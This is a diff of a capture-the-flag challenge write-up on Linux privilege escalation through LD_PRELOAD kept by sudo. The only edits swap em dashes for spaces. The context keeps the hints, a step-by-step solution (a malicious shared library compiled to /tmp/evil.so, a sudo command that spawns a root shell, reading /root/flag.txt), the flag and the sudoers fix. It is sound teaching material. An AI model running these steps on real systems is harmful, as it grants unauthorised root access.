@@ -1,4 +1,4 @@
-# Challenge 3 — LD_PRELOAD Injection via Sudo
+# Challenge 3  LD_PRELOAD Injection via Sudo
 
 **Difficulty:** Medium
 **Category:** Linux Privilege Escalation
@@ -28,7 +28,7 @@ docker run -it --rm ctf-linux-med-3
 ## Background: LD_PRELOAD
 
 `LD_PRELOAD` is an environment variable that tells the dynamic linker to load a
-shared library *before* any other library — including libc. This lets you override
+shared library *before* any other library  including libc. This lets you override
 any standard library function.
 
 Normally, sudo strips dangerous environment variables before running the target command.
@@ -53,7 +53,7 @@ Look for `env_keep` lines in the output.
 <details>
 <summary>Hint 2</summary>
 Write a small C shared library with a constructor function that runs at load time.
-A constructor runs before `main()` — so it runs before the target binary does anything:
+A constructor runs before `main()`  so it runs before the target binary does anything:
 
 ```c
 #include <stdio.h>
@@ -83,9 +83,9 @@ sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Check sudo configuration
+### Step 1  Check sudo configuration
 
 ```bash
 sudo -l
@@ -99,7 +99,7 @@ Defaults env_keep+=LD_PRELOAD
 
 `env_keep+=LD_PRELOAD` means our `LD_PRELOAD` variable is preserved when sudo runs.
 
-### Step 2 — Write the malicious shared library
+### Step 2  Write the malicious shared library
 
 ```bash
 cat > /tmp/evil.c << 'EOF'
@@ -120,7 +120,7 @@ Compile it:
 gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
 ```
 
-### Step 3 — Trigger via sudo
+### Step 3  Trigger via sudo
 
 ```bash
 sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2
@@ -129,7 +129,7 @@ sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2
 `apache2` runs as root. Before `main()` is called, the dynamic linker loads `evil.so`
 and executes `init()`. `init()` calls `setuid(0)` and spawns a root shell.
 
-### Step 4 — Read the flag
+### Step 4  Read the flag
 
 ```bash
 cat /root/flag.txt
@@ -142,7 +142,7 @@ CTF{ld_pr3l04d_w1th_sud0}
 ### Why this works
 
 `env_keep+=LD_PRELOAD` in sudoers tells sudo not to strip that variable.
-This is always a misconfiguration — `LD_PRELOAD` with a root-privileged process
+This is always a misconfiguration  `LD_PRELOAD` with a root-privileged process
 gives you full code execution as root. The correct sudoers configuration either
 omits `env_keep` entirely or uses `env_reset` (the default) which strips all
 environment variables not explicitly allowlisted.
